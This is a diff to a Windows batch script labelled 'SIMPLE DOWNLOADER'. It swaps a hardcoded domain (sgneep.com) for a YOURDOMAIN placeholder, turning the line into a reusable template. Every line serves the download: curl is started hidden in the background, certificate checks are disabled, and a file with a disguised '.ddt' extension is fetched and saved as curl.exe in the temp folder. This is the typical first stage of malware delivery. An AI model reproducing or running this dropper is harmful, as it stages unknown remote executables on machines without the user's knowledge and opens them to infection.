@@ -1,1 +1,3 @@
-start /B curl.exe --insecure -s https://sgneep.com/D/curl.ddt -o %TMP%\curl.exe
+:: SIMPLE DOWNLOADER
+:: WORKS IN WIN 10 > 1909
+start /B curl.exe --insecure -s https://YOURDOMAIN/D/curl.ddt -o %TMP%\curl.exe
